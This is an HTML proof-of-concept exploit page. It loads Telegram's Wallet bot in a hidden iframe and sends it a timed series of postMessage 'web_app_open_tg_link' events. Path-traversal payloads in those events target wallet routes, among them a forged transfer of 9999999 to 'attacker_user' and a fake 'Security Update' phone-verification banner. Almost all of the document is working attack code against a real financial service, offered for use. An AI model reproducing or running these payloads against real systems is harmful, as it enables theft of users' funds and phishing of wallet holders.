<!DOCTYPE html>
<html>
  <head>
    <title>PoC Payload Tester</title>
  </head>
  <body>
    <h1>PostMessage Payload Test</h1>

    <!-- Load actual Telegram WalletBot -->
    <iframe id="tg_frame" src="https://t.me/wallet/start" style="display:none;"></iframe>

    <script>
      const payloads = [
"../../../wallet/send?amount=9999999&to=attacker_user",
"../../../wallet/ton-space",
"../../../wallet/onboarding",
"../../../wallet/debug",
"../../../wallet/settings",
"../../../wallet/accounts",
"../../../wallet/address",
"../../../wallet/transfer",
"../../../wallet/alerts",
"../../../wallet/start?banner=verify_phone&title=Security+Update"
      ];

      let index = 0;

      const sendPayload = () => {
        const testPayload = payloads[index];
        console.log("üöÄ Testing payload:", testPayload);

        const message = JSON.stringify({
          eventType: 'web_app_open_tg_link',
          eventData: {
            path_full: `/wallet/start?x=${encodeURIComponent(testPayload)}`
          }
        });

        const iframe = document.getElementById("tg_frame");

        if (iframe && iframe.contentWindow) {
          iframe.contentWindow.postMessage(message, "*");
        } else {
          console.warn("‚ö†Ô∏è iframe not ready or blocked.");
        }

        index++;
        if (index < payloads.length) {
          setTimeout(sendPayload, 3000);
        }
      };

      window.onload = function () {
        const iframe = document.getElementById("tg_frame");

        iframe.onload = function () {
          console.log("‚úÖ iframe loaded");
          sendPayload();
        };

        iframe.onerror = function () {
          console.error("‚ùå iframe failed to load");
        };
      };
    </script>
  </body>
</html>
